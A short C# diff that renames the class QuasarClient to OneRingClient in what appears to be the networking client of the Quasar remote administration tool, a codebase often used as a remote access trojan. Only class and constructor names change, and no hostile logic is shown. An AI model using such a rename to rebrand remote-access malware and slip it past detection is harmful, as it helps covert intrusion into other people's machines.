@@ -11,7 +11,7 @@ using xClient.Core.Utilities;
 
 namespace xClient.Core.Networking
 {
-    public class QuasarClient : Client
+    public class OneRingClient : Client
     {
         /// <summary>
         /// When Exiting is true, stop all running threads and exit.
@@ -20,7 +20,7 @@ namespace xClient.Core.Networking
         public bool Authenticated { get; private set; }
         private readonly HostsManager _hosts;
 
-        public QuasarClient(HostsManager hostsManager) : base()
+        public OneRingClient(HostsManager hostsManager) : base()
         {
             this._hosts = hostsManager;
 
